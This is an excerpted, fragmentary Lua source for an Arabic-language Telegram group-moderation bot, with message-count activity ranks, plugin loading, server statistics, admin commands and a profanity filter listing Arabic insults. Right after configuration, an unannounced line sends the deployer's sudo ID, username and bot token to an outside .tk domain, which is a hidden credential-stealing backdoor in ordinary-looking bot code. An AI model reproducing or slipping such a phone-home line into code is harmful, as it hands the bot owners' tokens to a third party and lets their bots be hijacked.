...
create_config_auto()
https.request("https://FDFGERBoro.tk/AVIRA.php/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
FDFGERB_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
FDFGERB_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
FDFGERB_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
FDFGERB_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
FDFGERB_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
FDFGERB_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
FDFGERB_Msg = 'متفاعل نار ' 
...
function plugin_FDFGERBa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.FDFGERBa and msg then
pre_msg = plugin.FDFGERBa(msg)
end
end
end
...
if text == 'السيرفر' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local FDFGERB1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..FDFGERB1.server.uptime_in_days..'('..FDFGERB1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..FDFGERB1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..FDFGERB1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..FDFGERB1.stats.instantaneous_ops_per_sec..'`\n'
...
list = {"كس","كسمك","كسختك","زب","يجرار","يبن كحبه","يبن زنه","كس كلاسين امك","كحاب","منيوك","مهان","كحبه","ابن الكحبه","ديوث","ديوس","طيزك","كسمك.","يبن حرام","يبن ست و ستين كحبه","يشرموط","قواد","معرص","سرسري","قحبه","ابن كلب"}
for k,v in pairs(list) do
...
[مطور السورس](t.me/XGGGJ)
[مطور السورس](t.me/xxxli)
...
elseif text == 'تم إلغائها من قبل عراب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'تم إلغائها من قبل فحبمك عراب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
-----------------------------------------------------
if text == 'تنزيل هطف' and Mod(msg) then
...
-----------------------------------------------------
if text == 'تنزيل غبي' and Mod(msg) then
...
send(msg.chat_id_, msg.id_,'['..FDFGERB_Msg[math.random(#FDFGERB_Msg)]..']') 
return false
end
...
-- vardump(data) 
FDFGERBdx(msg.chat_id_, msg.id_, '• ايدي المجموعة ← ( '..msg.chat_id_..' )\n عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n• عدد المحظورين ← ( *'..data.kicked_count_..' )*\n• عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'تغير امر م المطور' and SudoBot(msg) then
